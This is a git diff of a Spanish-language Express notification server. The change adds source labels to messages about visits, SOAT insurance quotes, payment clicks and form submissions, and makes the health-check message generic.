@@ -16,21 +16,22 @@ app.post('/notificar', async (req, res) => {
 
   let mensaje = "";
 
-  // 👀 Visita al sitio
+  // 👀 Visita al sitio (Página de ventas SOAT)
   if (datos.tipo === "visita") {
-    mensaje = "👀 *Nuevo visitante ingresó al sitio*";
+    mensaje = "[VENTAS SOAT]\n👀 *Nuevo visitante ingresó al sitio*";
 
-  // 🖥️ Visita al panel (nuevo)
+  // 🖥️ Visita al panel (Página nueva)
   } else if (datos.tipo === "visita_panel") {
-    mensaje = "🖥️ *Nuevo acceso al panel de administración*";
+    mensaje = "[PÁGINA NUEVA]\n🖥️ *Nuevo acceso al panel de administración*";
 
-  // 📲 Clic en WhatsApp (nuevo)
+  // 📲 Clic en WhatsApp (Página nueva)
   } else if (datos.tipo === "whatsapp") {
-    mensaje = "📲 *Un usuario hizo clic en el botón de WhatsApp*";
+    mensaje = "[PÁGINA NUEVA]\n📲 *Un usuario hizo clic en el botón de WhatsApp*";
 
-  // 📊 Cotización
+  // 📊 Cotización (Página de ventas SOAT)
   } else if (datos.tipo === "cotizacion") {
     mensaje = `
+[VENTAS SOAT]
 📊 *Nueva cotización de SOAT:*
 🚗 *Placa:* ${datos.placa || 'No proporcionada'}
 📄 *Clase:* ${datos.clase || 'N/A'}
@@ -39,18 +40,20 @@ app.post('/notificar', async (req, res) => {
 💰 *Valor estimado:* ${datos.valor || '$0'}
 `.trim();
 
-  // 🟡 Clic en Pagar
+  // 🟡 Clic en Pagar (Página de ventas SOAT)
   } else if (datos.tipo === "pago") {
     mensaje = `
+[VENTAS SOAT]
 🟡 *Clic en Pagar*
 📧 *Correo:* ${datos.correo || 'N/A'}
 🚗 *Placa:* ${datos.placa || 'N/A'}
 💵 *Valor:* ${datos.valor || '$0'}
 `.trim();
 
-  // 📥 Envío de formulario completo
+  // 📥 Envío de formulario completo (Página de ventas SOAT)
   } else {
     mensaje = `
+[VENTAS SOAT]
 📥 *Nueva solicitud de SOAT*:
 🚗 *Placa:* ${datos.placa || 'No proporcionada'}
 💵 *Valor estimado:* ${datos.valor || '$0'}
@@ -90,12 +93,13 @@ app.post('/notificar', async (req, res) => {
 
 // Ruta de prueba para verificar si el servidor está corriendo
 app.get('/', (req, res) => {
-  res.send('🟢 Servidor de notificación SOAT funcionando');
+  res.send('🟢 Servidor de notificación funcionando');
 });
-
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚀 Servidor corriendo en el puerto ${PORT}`);
 });
+
+
 
